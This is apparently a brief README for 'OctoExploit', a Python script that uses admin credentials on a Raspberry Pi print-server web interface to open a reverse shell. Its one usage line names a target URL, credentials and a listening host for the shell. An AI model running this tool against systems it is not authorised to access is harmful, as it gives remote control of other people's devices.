# OctoExploit

**IMPORTANT**: Admin user privileges or additional permissions such as Settings Admin are required.

I created this exploit because I always forget the password to access the raspberry pi, this way I can access it with reverse shell =P

**USAGE**: python3 octoexploit.py -u http<span>://</span>192.168.1.X -U admin -P password -lh 192.168.1.X
